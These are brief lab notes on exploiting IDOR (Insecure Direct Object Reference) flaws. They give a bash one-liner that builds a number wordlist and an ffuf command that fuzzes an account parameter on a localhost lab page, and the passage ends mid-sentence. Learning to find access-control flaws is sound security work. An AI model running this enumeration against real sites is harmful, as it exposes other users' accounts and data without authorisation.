## **Overview**

**IDOR** stands for Insecure Direct Object Reference
- An access control issue
- Request particular resource with an object ID
- View dashboard or pages of other user


## **Exploitation**

- Website as an object ID parameter where we can test to see if the vulnerability exists

- For sure it exists let fuzz for all user endpoint, try creating a wordlist of all numbers from 1-2000, with this bash one liner

```bash
$ for i in `seq 1 2000`; do echo $i ; done > num.txt
```

- Now use the following `ffuf` syntax to fuzz

```bash
# ffuf -u "http://localhost/labs/e0x02.php?account=FUZZ" -w num.txt
```


- As usual some request has `193` words and some `189`

- we can therefore filter by words with `-fw 189` since those are the wrong ones (after manually checking) and we have this
